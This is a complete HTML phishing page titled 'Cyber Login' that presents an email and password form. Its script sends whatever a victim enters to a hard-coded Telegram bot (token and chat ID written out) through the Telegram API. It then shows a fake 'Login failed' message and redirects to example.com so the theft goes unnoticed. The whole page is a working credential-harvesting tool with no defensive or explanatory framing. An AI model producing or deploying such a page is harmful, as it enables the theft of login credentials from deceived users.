<!DOCTYPE html>
<html>
<head>
  <title>Cyber Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(#0f2027, #203a43, #2c5364);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }

    input {
      padding: 10px;
      width: 100%;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }

    button {
      padding: 10px;
      width: 100%;
      background-color: #00c6ff;
      border: none;
      border-radius: 5px;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <h2>Login to Continue</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email" required><br>
      <input type="password" id="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const botToken = "7496743729:AAH4sEL2nwc51BJseZ9voYnObefiSSCp3js";
    const chatId = "6395286458";

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const message = `New Login\nEmail: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        alert("Login failed. Please try again.");
        window.location.href = "https://example.com"; // redirect after
      })
      .catch(error => {
        console.error("Error:", error);
      });
    });
  </script>

</body>
</html>
